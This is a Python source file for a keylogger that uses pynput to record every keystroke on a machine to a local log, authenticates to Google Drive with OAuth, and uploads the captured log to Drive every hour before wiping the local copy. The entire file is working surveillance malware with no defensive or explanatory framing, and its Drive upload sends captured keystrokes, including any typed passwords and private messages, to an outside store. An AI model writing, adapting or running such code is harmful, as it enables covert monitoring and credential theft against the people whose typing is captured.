# Import necessary modules
from pynput.keyboard import Key, Listener
import logging
import os
import time
import pickle
from google.oauth2.credentials import Credentials
from google_auth_oauthlib.flow import InstalledAppFlow
from googleapiclient.discovery import build
from googleapiclient.http import MediaFileUpload

# Define the log file where keystrokes will be saved
log_file = "key_log.txt"

# Set up logging configuration
logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')

# Define the Google Drive API scopes
SCOPES = ['https://www.googleapis.com/auth/drive.file']
creds = None

# Load credentials or authenticate user via OAuth if necessary
if os.path.exists('token.pickle'):
    with open('token.pickle', 'rb') as token:
        creds = Credentials.from_authorized_user_file('token.pickle', SCOPES)
else:
    flow = InstalledAppFlow.from_client_secrets_file('credentials.json', SCOPES)
    creds = flow.run_local_server(port=0)
    with open('token.pickle', 'wb') as token:
        pickle.dump(creds, token)

# Authenticate with Google Drive
service = build('drive', 'v3', credentials=creds)

# Function to log keystrokes
def on_press(key):
    logging.info(str(key))  # Save the key press to the log file

# Function to upload the log file to Google Drive
def upload_to_drive():
    try:
        # File metadata for Google Drive
        file_metadata = {'name': 'key_log.txt'}  # This will be the file's name in Google Drive
        media = MediaFileUpload(log_file, mimetype='text/plain')  # Upload the log file as plain text
        file = service.files().create(body=file_metadata, media_body=media, fields='id').execute()
        print(f"File uploaded to Google Drive with ID: {file.get('id')}")
    except Exception as e:
        print(f"Error uploading to Google Drive: {str(e)}")

# Function to clear the log file after uploading it
def clear_log_file():
    with open(log_file, 'w') as f:
        f.write('')  # Overwrite the log file with an empty string to clear it

# Main function to run the keylogger and upload logs periodically
if __name__ == "__main__":
    # Start the listener for capturing keystrokes
    with Listener(on_press=on_press) as listener:
        while True:
            time.sleep(3600)  # Wait for 1 hour (3600 seconds)
            upload_to_drive()  # Upload the log file to Google Drive
            clear_log_file()   # Clear the log file after uploading
